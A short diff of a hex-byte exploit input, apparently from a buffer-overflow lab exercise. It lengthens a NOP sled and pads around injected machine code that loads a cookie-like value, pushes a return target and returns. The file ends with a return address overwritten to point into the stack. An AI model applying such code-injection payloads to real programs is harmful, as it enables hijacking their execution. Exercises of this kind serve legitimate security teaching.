@@ -68,10 +68,12 @@
 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90
 90 90
-
-/* 518-byte nop sled */
+90 90 90 90 90 90 90 90
+90 90
+/* 528-byte nop sled */
 48 8d 6c 24 20
 48 c7 c0 d1 9c b2 3f
 68 85 13 40 00
-c3 /* code from .s file */
+c3 /* 18-byte code from .s file */
+00 00 00 00 00 00   /* keep it even 8- remainder */
 90 33 78 55 00 00 00 00 /* return address */
